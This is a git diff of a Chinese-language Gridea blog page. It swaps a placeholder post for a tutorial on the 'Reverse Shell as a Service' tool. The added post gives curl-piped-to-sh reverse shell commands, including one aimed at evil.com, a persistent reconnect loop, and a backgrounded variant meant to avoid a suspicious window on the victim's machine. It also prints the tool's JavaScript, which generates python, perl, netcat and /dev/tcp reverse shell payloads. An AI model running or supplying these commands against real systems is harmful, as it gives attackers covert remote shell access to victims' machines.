@@ -3,7 +3,7 @@
     <meta charset="utf-8"/>
 <meta name="description" content=""/>
 <meta name="viewport" content="width=device-width, initial-scale=1"/>
-<title>New beginning | Gridea</title>
+<title>快速尝试多种反弹shell | Gridea</title>
 <link rel="shortcut icon" href="https://ukonwho.github.io/favicon.ico?v=1590132600408">
 <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.css" rel="stylesheet">
 <link rel="stylesheet" href="https://ukonwho.github.io/styles/main.css">
@@ -87,25 +87,102 @@
         <div class="post-detail gt-bg-theme-color-second">
             <article class="gt-post-content">
                 <h2 class="post-title">
-                    New beginning
+                    快速尝试多种反弹shell
                 </h2>
                 <div class="post-info">
                     <time class="post-time gt-c-content-color-first">
                         · 2020-05-22 ·
                     </time>
                     
-                        <a href="https://ukonwho.github.io/tag/rj002E9zm/" class="post-tags">
-                            # Gridea
+                        <a href="https://ukonwho.github.io/tag/txSlYMpK3/" class="post-tags">
+                            # tick
+                        </a>
+                    
+                        <a href="https://ukonwho.github.io/tag/6Yp22rigeP/" class="post-tags">
+                            # shell
                         </a>
                     
                 </div>
                 <div class="post-content">
-                    <p>😘 Enjoy~</p>
+                    <p>Reverse Shell as a Service - https://shell.now.sh</p>
+<ul>
+<li>项目地址：https://github.com/lukechilds/reverse-shell</li>
+</ul>
+<h1 id="使用">使用</h1>
+<h2 id="1-常规用法">1. 常规用法</h2>
+<pre><code class="language-bash"># 通过ip连接
+curl https://shell.now.sh/192.168.0.69:1337 | sh
+
+# 通过主机名连接
+curl https://shell.now.sh/localhost:1337 | sh
+
+# 远程连接，因为这是反向连接，所以它可以穿透防火墙并连接到Internet
+# 您可以在evil.com上的服务器上侦听连接，并从具有安全网络的内部获得反向shell
+curl https://shell.now.sh/evil.com:1337 | sh
+</code></pre>
+<h2 id="2-保持重连">2. 保持重连</h2>
+<pre><code class="language-bash">while true; do curl https://shell.now.sh/yourip:1337 | sh; done
+</code></pre>
+<h2 id="3-作为后台进程运行">3. 作为后台进程运行</h2>
+<p>终端会话需要保持打开状态以保持反向shell连接。</p>
+<p>以下命令将在后台进程中运行反向shell程序并退出终端，在受害者的计算机上没有打开看起来可疑的终端窗口。</p>
+<p>确保在新的终端窗口中运行此命令，否则将丢失现有会话中的任何工作。</p>
+<pre><code class="language-bash">sh -c &quot;curl https://shell.now.sh/localhost:1337 | sh -i &amp;&quot; &amp;&amp; exit
+</code></pre>
+<h1 id="演示">演示</h1>
+<figure data-type="image" tabindex="1"><img src="https://ukonwho.github.io/post-images/1590131423766.gif" alt="" loading="lazy"></figure>
+<h1 id="关键代码">关键代码</h1>
+<pre><code class="language-javascript">'use strict';
+
+const usage = `# Reverse Shell as a Service
+# https://github.com/lukechilds/reverse-shell
+#
+# 1. On your machine:
+#      nc -l 1337
+#
+# 2. On the target machine:
+#      curl https://shell.now.sh/yourip:1337 | sh
+#
+# 3. Don't be a dick`;
+
+const generateScript = (host, port) =&gt; {
+	const payloads = {
+		python: `python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;${host}&quot;,${port})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'`,
+		perl: `perl -e 'use Socket;$i=&quot;${host}&quot;;$p=${port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'`,
+		nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ${host} ${port} &gt;/tmp/f`,
+		sh: `/bin/sh -i &gt;&amp; /dev/tcp/${host}/${port} 0&gt;&amp;1`
+	};
+
+	return Object.entries(payloads).reduce((script, [cmd, payload]) =&gt; {
+		script += `
+if command -v ${cmd} &gt; /dev/null 2&gt;&amp;1; then
+	${payload}
+	exit;
+fi`;
+
+		return script;
+	}, '');
+};
+
+const reverseShell = req =&gt; {
+	const [host, port] = req.url.substr(1).split(':');
+	return usage + (host &amp;&amp; port &amp;&amp; generateScript(host, port));
+};
+
+module.exports = reverseShell;
+</code></pre>
 
                 </div>
             </article>
         </div>
 
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://ukonwho.github.io/post/new-begining/" class="post-title gt-a-link">
+                    New beginning
+                </a>
+            </div>
         
 
         
